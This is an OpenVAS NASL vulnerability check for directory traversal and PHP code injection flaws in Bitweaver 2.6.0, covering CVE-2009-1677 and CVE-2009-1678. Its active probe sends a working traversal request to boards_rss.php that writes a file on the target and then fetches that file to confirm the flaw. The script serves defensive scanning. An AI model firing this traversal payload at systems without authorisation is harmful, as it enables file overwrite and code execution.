###############################################################################
# OpenVAS Vulnerability Test
#
# Bitweaver Directory Traversal And Code Injection Vulnerabilities
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:bitweaver:bitweaver";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900356");
  script_version("2019-04-29T15:08:03+0000");
  script_tag(name:"last_modification", value:"2019-04-29 15:08:03 +0000 (Mon, 29 Apr 2019)");
  script_tag(name:"creation_date", value:"2009-05-26 15:05:11 +0200 (Tue, 26 May 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1677", "CVE-2009-1678");
  script_bugtraq_id(34910);
  script_name("Bitweaver Directory Traversal And Code Injection Vulnerabilities");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_bitweaver_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Bitweaver/installed");
  script_tag(name:"impact", value:"Successful exploitation will let the attacker to cause PHP code injection,
  directory traversal, gain sensitive information, and can cause arbitrary
  code execution inside the context of the web application.");
  script_tag(name:"affected", value:"Bitweaver version 2.6.0 and prior");
  script_tag(name:"insight", value:"Multiple flaws are due to improper handling of user supplied input in saveFeed
  function in rss/feedcreator.class.php file and it can cause following attacks.

  - PHP code injection via placing PHP sequences into the account 'display name'
    setting for authenticated users or in the HTTP Host header for remote users
    by sending a request to boards/boards_rss.php.

  - Directory traversal allow remote user to create or overwrite arbitrary file
    via a .. (dot dot) in the version parameter to boards/boards_rss.php.");
  script_tag(name:"solution", value:"Upgrade to Bitweaver version 2.6.1 or later.");
  script_tag(name:"summary", value:"This host is running Bitweaver, which is prone to directory traversal and
  code injection vulnerabilities.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/35057");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/8659");
  script_xref(name:"URL", value:"http://www.bitweaver.org/articles/121");
  script_xref(name:"URL", value:"http://www.bitweaver.org/downloads/file/16337");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("host_details.inc");

if(!bitweaverPort = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:bitweaverPort))exit(0);

# if short_open_tag in php.ini is off (because of "<?xml ..." preamble
# generating a parse error with short_open_tag = on), you can now launch
# commands:

pocReq = http_get(item:string(dir + "/boards/boards_rss.php?version=/../../../../bookoo.php \r\n\r\n"), port:bitweaverPort);
rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);

if("Set-Cookie: BWSESSION" >< rcvRes &&
   egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
{
  pocReq = http_get(item:string(dir + "/bookoo.php.xml \r\n\r\n"), port:bitweaverPort);
  rcvRes = http_send_recv(port:bitweaverPort, data:pocReq);

  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) && "<title> Feed</title>" >< rcvRes)
  {
    security_message(bitweaverPort);
    exit(0);
  }
}